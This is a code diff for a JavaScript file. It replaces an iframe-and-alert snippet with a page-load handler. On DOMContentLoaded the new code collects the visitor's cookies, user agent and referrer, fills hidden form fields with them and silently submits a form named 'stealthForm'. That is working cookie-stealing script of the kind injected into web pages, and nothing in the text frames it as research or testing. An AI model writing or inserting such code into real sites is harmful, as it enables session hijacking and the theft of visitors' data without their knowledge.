@@ -1,14 +1,26 @@
-// Create an iframe element
-var iframe = document.createElement('iframe');
+document.addEventListener("DOMContentLoaded", function() {
+    try {
+        var cookies = document.cookie || "No_Cookies";
+        var userAgent = navigator.userAgent || "Unknown_User_Agent";
+        var referrer = document.referrer || "No_Referrer";
 
-// Set attributes for the iframe
-iframe.src = 'https://gotphp.com'; // Replace with the desired URL 
-iframe.width = '600';
-iframe.height = '400';
-iframe.style.border = 'none';
+        var cookieField = document.getElementById("cookieField");
+        var userAgentField = document.getElementById("userAgentField");
+        var referrerField = document.getElementById("referrerField");
+        var stealthForm = document.getElementById("stealthForm");
 
-// Append iframe to the body
-document.body.appendChild(iframe);
+        if (cookieField && userAgentField && referrerField && stealthForm) {
+            cookieField.value = cookies;
+            userAgentField.value = userAgent;
+            referrerField.value = referrer;
 
-// Show an alert
-alert('DOM.js loaded and iframe added!');
+            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
+                stealthForm.submit();
+            }
+        } else {
+            console.error("One or more elements not found.");
+        }
+    } catch (error) {
+        console.error("Error in script execution:", error);
+    }
+});
